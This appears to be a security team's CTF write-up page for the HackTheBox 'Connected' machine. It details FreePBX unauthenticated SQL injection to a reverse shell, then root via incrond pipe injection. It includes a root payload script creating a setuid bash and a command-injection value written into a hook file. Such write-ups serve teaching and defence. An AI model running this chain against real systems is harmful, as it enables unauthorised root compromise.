@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Connected</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Easy · Linux</span>
+  <h1>Connected</h1>
+  <div class="subtitle">HackTheBox — Season 11</div>
+  <div class="tags">
+    <span class="tag">FreePBX SQLi</span>
+    <span class="tag">MySQL Event Scheduling</span>
+    <span class="tag">incrond Pipe Injection</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">Unauthenticated SQLi</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">MySQL Event RCE</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">incrond Hook Abuse</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Pipe Injection</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Reconnaissance</h2></div>
+    <p><strong>Port Scan</strong></p>
+    <pre><code>nmap -sV -sC -p- --min-rate 5000 &lt;TARGET_IP&gt;</code></pre>
+    <p><strong>Results:</strong></p>
+    <pre><code>22/tcp → OpenSSH 7.4
+80/tcp → Apache httpd 2.4.6 (PHP/7.4.16)
+443/tcp → Apache httpd 2.4.6 (SSL)</code></pre>
+    <p>Port 80 redirects to <code>http://connected.htb</code>. Add the hostname:</p>
+    <pre><code>echo "&lt;TARGET_IP&gt; connected.htb" | sudo tee -a /etc/hosts</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Initial Access — FreePBX</h2></div>
+    <p>The web interface is <strong>FreePBX 16.0.40.7</strong>.</p>
+    <p><strong>Foothold — Unauthenticated SQLi to RCE (CVE-2025-57819)</strong></p>
+    <p>FreePBX 16.0.40.7 is vulnerable to an <mark class="rust">unauthenticated SQL injection</mark> in <code>/admin/ajax.php</code>. The database user has <mark>EVENT privileges</mark>, allowing us to create a scheduled MySQL event that executes a reverse shell.</p>
+    <p><strong>Exploit:</strong></p>
+    <p>1. Start a listener:</p>
+    <pre><code>nc -lvnp 4444</code></pre>
+    <p>Use the Metasploit module (recommended) or manual SQL injection to insert a cron job / MySQL event that downloads and executes a reverse shell. You will receive a shell as the <code>asterisk</code> user.</p>
+    <p><strong>User Flag</strong></p>
+    <pre><code>cat /home/asterisk/user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>Database EVENT privileges are easy to overlook during hardening — they turn a 'read-only' SQL injection into a full command-execution primitive without needing file-write access anywhere on disk.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Privilege Escalation — incrond + sysadmin_manager Pipe Injection</h2></div>
+    <p><strong>Discovery</strong></p>
+    <pre><code>ps aux | grep incrond
+cat /etc/incron.d/sysadmin</code></pre>
+    <p>The system uses <code>incrond</code> (inotify-based cron) watching <code>/var/spool/asterisk/incron/</code>. Any file modification triggers:</p>
+    <pre><code>/usr/bin/sysadmin_manager &lt;filename&gt;</code></pre>
+    <p>This binary runs as <mark class="rust">root</mark> and has a <mark>pipe injection vulnerability</mark> when handling signed hooks.</p>
+
+    <p><strong>Exploitation</strong></p>
+    <p>Create the root payload:</p>
+    <pre><code>cat > /var/spool/asterisk/evil << 'EOF'
+#!/bin/bash
+id > /var/spool/asterisk/rootproof.txt 2>&1
+whoami >> /var/spool/asterisk/rootproof.txt 2>&1
+cat /root/root.txt > /var/spool/asterisk/rootflag.txt 2>&1
+cp /bin/bash /var/spool/asterisk/.rootbash 2>&1
+chmod 6777 /var/spool/asterisk/.rootbash 2>&1
+EOF
+chmod +x /var/spool/asterisk/evil</code></pre>
+
+    <p>Trigger the vulnerability with correct filename (CONTENTS mode):</p>
+    <pre><code>printf '%s' 'x | /var/spool/asterisk/evil' > /var/spool/asterisk/incron/framework.logrotate.CONTENTS
+sleep 6</code></pre>
+
+    <p>Verify execution:</p>
+    <pre><code>cat /var/spool/asterisk/rootproof.txt
+cat /var/spool/asterisk/rootflag.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+
+    <p>Interactive root shell:</p>
+    <pre><code>/var/spool/asterisk/.rootbash -p</code></pre>
+
+    <div class="why"><strong>Why this mattered</strong>Watching for inotify/cron-style automation tied to a privileged binary is a productive Linux privesc habit — the trust boundary between 'a file changed' and 'run this file's contents as root' is often thinner than it looks.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Attack Chain Summary</h2></div>
+    <p><strong>Recon</strong> → FreePBX 16.0.40.7 identified via web + SSL cert<br>
+    <strong>Foothold</strong> → Unauthenticated SQLi → Reverse shell as asterisk<br>
+    <strong>Enumeration</strong> → Discovered incrond watching incron directory<br>
+    <strong>Privesc</strong> → Pipe injection via signed framework.logrotate hook + CONTENTS mode<br>
+    <strong>Root</strong> → Arbitrary command execution as root</p>
+  </div>
+
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
